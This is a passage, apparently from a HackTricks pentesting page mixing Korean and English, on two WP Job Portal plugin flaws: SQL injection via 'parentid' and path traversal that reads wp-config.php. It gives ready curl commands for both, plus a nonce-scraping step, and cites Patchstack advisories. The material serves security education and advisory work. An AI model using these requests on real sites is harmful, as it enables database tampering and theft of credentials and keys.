. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **검증되지 않은 사용자 입력** – `parentid`가 HTTP 요청에서 그대로 전달됩니다.
2. **WHERE 절 내부의 문자열 연결** – `is_numeric()` / `esc_sql()` / prepared statement가 없습니다.
3. **인증되지 않은 접근 가능성** – 액션은 `admin-post.php`를 통해 실행되지만, 유일한 검증은 **CSRF nonce** (`wp_verify_nonce()` )이며, 이는 단축코드 `[wpjobportal_my_resumes]`를 포함한 공개 페이지에서 누구나 가져올 수 있습니다.

#### Exploitation

1. Grab a fresh nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inject arbitrary SQL by abusing `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
The response discloses the result of the injected query or alters the database, proving SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Another task, **downloadcustomfile**, allowed visitors to download **디스크상의 모든 파일** via path traversal. The vulnerable sink is located in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name`은 공격자가 제어하며 **검증 없이** 이어붙여집니다. 다시 말해, 유일한 장벽은 이력서 페이지에서 가져올 수 있는 **CSRF nonce**입니다.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
서버가 `wp-config.php`의 내용을 반환하여 leaking DB credentials and auth keys.

## 참조

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
